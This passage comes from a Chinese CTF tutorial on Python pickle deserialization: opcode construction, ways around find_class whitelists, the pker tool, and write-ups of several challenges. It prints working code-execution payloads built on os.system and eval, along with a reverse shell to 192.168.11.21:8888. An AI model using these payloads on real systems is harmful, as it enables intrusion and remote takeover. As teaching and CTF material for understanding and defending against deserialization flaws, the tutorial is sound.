python源码：
    # secret.py
    name='TEST3213qkfsmfo'
    # main.py
    import pickle
    import secret
    opcode='''c__main__
    secret
    (S'name'
    S'1'
    db.'''
    print('before:',secret.name)
    output=pickle.loads(opcode.encode())
    print('output:',output)
    print('after:',secret.name)
首先，通过 `c` 获取全局变量 `secret` ，然后建立一个字典，并使用 `b` 对secret进行属性设置，使用到的payload：
    opcode='''c__main__
    secret
    (S'name'
    S'1'
    db.'''
#### 函数执行
与函数执行相关的opcode有三个： `R` 、 `i` 、 `o` ，所以我们可以从三个方向进行构造：
  1. `R` ：
    b'''cos
    system
    (S'whoami'
    tR.'''
  1. `i` ：
    b'''(S'whoami'
    ios
    system
    .'''
  1. `o` ：
    b'''(cos
    system
    S'whoami'
    o.'''
#### 实例化对象
实例化对象是一种特殊的函数执行，这里简单的使用 `R` 构造一下，其他方式类似：
    class Student:
        def __init__(self, name, age):
            self.name = name
            self.age = age
    data=b'''c__main__
    Student
    (S'XiaoMing'
    S"20"
    tR.'''
    a=pickle.loads(data)
    print(a.name,a.age)
#### pker的使用（推荐）
  * pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012)。
  * 使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。
#### 注意事项
pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：
    # linux(注意posix):
    b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
    # windows(注意nt):
    b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
### CTF实战
#### 做题之前：了解`pickle.Unpickler.find_class()`
由于官方针对pickle的安全问题的建议是修改`find_class()`，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。  
什么时候会调用`find_class()`：
  1. 从opcode角度看，当出现`c`、`i`、`b'\x93'`时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。
  2. 从python代码来看，`find_class()`只会在解析opcode时调用一次，所以只要绕过opcode执行过程，`find_class()`就不会再调用，也就是说`find_class()`只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过`__import__`绕过一些黑名单。 
下面先看两个例子：
    safe_builtins = {'range','complex','set','frozenset','slice',}
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            # Only allow safe classes from builtins.
            if module == "builtins" and name in safe_builtins:
                return getattr(builtins, name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" %(module, name))
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            if module == '__main__': # 只允许__main__模块
                return getattr(sys.modules['__main__'], name)
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
  * 第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为`{'range','complex','set','frozenset','slice',}`。
  * 第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许`__main__`模块。虽然看起来很安全，但是被引入主程序的模块都可以通过`__main__`调用修改，所以造成了变量覆盖。
由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过`find_class`函数内的限制就是pickle反序列化解题的关键。  
此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做题的时候可以先把白名单模块的文档看一看:)
#### Code-Breaking:picklecode
题目将pickle能够引入的模块限定为`builtins`，并且设置了子模块黑名单：`{'eval', 'exec', 'execfile',
'compile', 'open', 'input', '__import__', 'exit'}`，于是我们能够 **直接** 利用的模块有：
  * `builtins`模块中，黑名单外的子模块。
  * 已经`import`的模块：`io`、`builtins`（需要先利用`builtins`模块中的函数）
黑名单中没有`getattr`，所以可以通过`getattr`获取`io`或`builtins`的子模块以及子模块的子模块:)，而`builtins`里有`eval、exec`等危险函数，即使在黑名单中，也可以通过`getattr`获得。pickle不能直接获取`builtins`一级模块，但可以通过`builtins.globals()`获得`builtins`；这样就可以执行任意代码了。payload为：
    b'''cbuiltins
    getattr
    p0
    (cbuiltins
    dict
    S'get'
    tRp1
    cbuiltins
    globals
    )Rp2
    00g1
    (g2
    S'builtins'
    tRp3
    0g0
    (g3
    S'eval'
    tR(S'__import__("os").system("whoami")'
    tR.
    '''
#### watevrCTF-2019:Pickle Store
因为题目是黑盒，所以没有黑白名单限制，直接改cookie反弹shell即可。payload：
    b'''cos
    system
    (S"bash -c 'bash -i >& /dev/tcp/192.168.11.21/8888 0>&1'"
    tR.
    '''
#### 高校战疫网络安全分享赛:webtmp
限制中，改写了`find_class`函数，只能生成`__main__`模块的pickle：
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            if module == '__main__': # 只允许__main__模块
                return getattr(sys.modules['__main__'], name)
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
此外，禁止了`b'R'`：
    try:
        pickle_data = request.form.get('data')
        if b'R' in base64.b64decode(pickle_data): 
            return 'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'
目标是覆盖secret中的验证，由于secret被主程序引入，是存在于`__main__`下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：
    b'''c__main__
    secret
    (S'name'
    S"1"
    S"category"
    S"2"
    db0(S"1"
    S"2"
    i__main__
    Animal
    .'''
除了以上这些题外，还有BalsnCTF:pyshv1-v3和SUCTF-2019:guess_game四道题，由于手动写还是比较麻烦，在后文中使用pker工具完成。
## pker使用说明
### 简介
  * pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在下载源码。
  * 使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。
  * 再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。
  * 此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。
### pker能做的事
引用自：
>   * 变量赋值：存到memo中，保存memo下标和变量名即可
>   * 函数调用
>   * 类型字面量构造
>   * list和dict成员修改
>   * 对象成员变量修改
>
具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。
### 使用方法与示例
  1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
  2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
  3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：
    以下module都可以是包含`.`的子module
    调用函数时，注意传入的参数类型要和示例一致
    对应的opcode会被生成，但并不与pker代码相互等价
    GLOBAL
    对应opcode：b'c'
    获取module下的一个全局对象（没有import的也可以，比如下面的os）：
    GLOBAL('os', 'system')
    输入：module,instance(callable、module都是instance)  
    INST
    对应opcode：b'i'
    建立并入栈一个对象（可以执行一个函数）：
    INST('os', 'system', 'ls')  
    输入：module,callable,para 
    OBJ
    对应opcode：b'o'
    建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
    OBJ(GLOBAL('os', 'system'), 'ls') 
    输入：callable,para
    xxx(xx,...)
    对应opcode：b'R'
    使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）
    li[0]=321
    或
    globals_dic['local_var']='hello'
    对应opcode：b's'
    更新列表或字典的某项的值
    xx.attr=123
    对应opcode：b'b'
    对xx对象进行属性设置
    return
    对应opcode：b'0'
    出栈（作为pickle.loads函数的返回值）：
    return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
注意：
  1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为 **左值** ，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符， **作为右值是可以的** 。即“查值不行，赋值可以”。
  2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode: